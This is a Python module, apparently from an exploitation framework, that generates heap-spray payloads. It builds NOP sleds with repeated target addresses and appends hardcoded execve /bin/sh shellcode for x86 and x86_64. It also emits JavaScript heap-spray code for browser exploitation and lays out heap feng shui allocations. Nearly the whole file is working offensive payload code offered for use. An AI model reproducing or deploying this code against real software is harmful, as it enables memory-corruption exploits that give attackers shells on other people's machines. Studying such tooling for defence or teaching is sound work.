"""
Heap Spray Module
Automated heap spraying for exploitation
"""

import logging
from typing import Dict, List, Any
import struct

logger = logging.getLogger(__name__)


class HeapSpray:
    """
    Heap spraying techniques for exploitation
    """
    
    def __init__(self, config: Dict[str, Any]):
        self.config = config
        self.architecture = config.get('architecture', 'x86_64')
        
    def generate_spray(self, target_info: Dict[str, Any]) -> bytes:
        """
        Generate heap spray payload
        
        Args:
            target_info: Target information
            
        Returns:
            Spray payload
        """
        logger.info("Generating heap spray")
        
        spray_size = target_info.get('spray_size', 1024 * 1024)  # 1MB default
        target_address = target_info.get('target_address', 0x0c0c0c0c)
        
        # Build spray block
        spray_block = self._build_spray_block(target_address)
        
        # Repeat to fill heap
        num_blocks = spray_size // len(spray_block)
        spray_payload = spray_block * num_blocks
        
        logger.info(f"Heap spray: {len(spray_payload)} bytes, target: {hex(target_address)}")
        
        return spray_payload
    
    def _build_spray_block(self, target_address: int) -> bytes:
        """Build individual spray block"""
        block = b''
        
        if self.architecture == 'x86_64':
            # 64-bit addresses
            addr_bytes = struct.pack('<Q', target_address)
            # NOP sled + shellcode
            block = b'\x90' * 64  # NOP sled
            block += addr_bytes * 10  # Repeated addresses
            
        elif self.architecture == 'x86':
            # 32-bit addresses
            addr_bytes = struct.pack('<I', target_address)
            block = b'\x90' * 32
            block += addr_bytes * 10
        
        # Add shellcode at the end
        block += self._get_shellcode()
        
        # Pad to alignment
        while len(block) % 16 != 0:
            block += b'\x90'
        
        return block
    
    def _get_shellcode(self) -> bytes:
        """Get shellcode for architecture"""
        if self.architecture == 'x86_64':
            # execve /bin/sh
            return (
                b"\x48\x31\xd2"
                b"\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"
                b"\x48\xc1\xeb\x08"
                b"\x53"
                b"\x48\x89\xe7"
                b"\x50"
                b"\x57"
                b"\x48\x89\xe6"
                b"\xb0\x3b"
                b"\x0f\x05"
            )
        else:  # x86
            return (
                b"\x31\xc0"
                b"\x50"
                b"\x68\x2f\x2f\x73\x68"
                b"\x68\x2f\x62\x69\x6e"
                b"\x89\xe3"
                b"\x50"
                b"\x53"
                b"\x89\xe1"
                b"\xb0\x0b"
                b"\xcd\x80"
            )
    
    def generate_javascript_spray(self, target_address: int, size: int = 200) -> str:
        """
        Generate JavaScript heap spray for browser exploitation
        
        Args:
            target_address: Target address to spray
            size: Number of spray objects (MB)
            
        Returns:
            JavaScript code for spraying
        """
        logger.info(f"Generating JavaScript heap spray: {size}MB")
        
        # Convert address to JavaScript format
        addr_str = f"0x{target_address:08x}"
        
        js_code = f"""
        // Heap spray
        var spray = new Array();
        var spray_size = {size};
        
        // Build spray block
        var block_size = 0x40000;  // 256KB blocks
        var block = "";
        
        // NOP sled (in JavaScript, use harmless instructions)
        for(var i = 0; i < 0x1000; i++) {{
            block += unescape("%u9090");  // NOP sled
        }}
        
        // Add shellcode address
        var addr = unescape("%u{target_address:04x}%u{(target_address >> 16):04x}");
        for(var i = 0; i < 0x100; i++) {{
            block += addr;
        }}
        
        // Spray heap
        for(var i = 0; i < spray_size; i++) {{
            spray[i] = block.substring(0, block_size/2);
        }}
        
        // Trigger vulnerability here
        """
        
        return js_code
    
    def feng_shui_spray(self, target_info: Dict[str, Any]) -> List[bytes]:
        """
        Heap feng shui - precise heap layout manipulation
        
        Args:
            target_info: Target heap information
            
        Returns:
            Sequence of allocations for heap shaping
        """
        logger.info("Performing heap feng shui")
        
        allocations = []
        
        # Phase 1: Fill holes in heap
        hole_size = target_info.get('hole_size', 64)
        for _ in range(10):
            allocations.append(b'A' * hole_size)
        
        # Phase 2: Create predictable layout
        target_size = target_info.get('target_size', 128)
        for _ in range(5):
            allocations.append(b'B' * target_size)
        
        # Phase 3: Free every other allocation to create gaps
        # (This would be done by the exploit logic)
        
        # Phase 4: Fill gaps with controlled data
        controlled_data = self._build_spray_block(target_info.get('target_address', 0x41414141))
        for _ in range(5):
            allocations.append(controlled_data)
        
        logger.info(f"Heap feng shui: {len(allocations)} allocations")
        
        return allocations
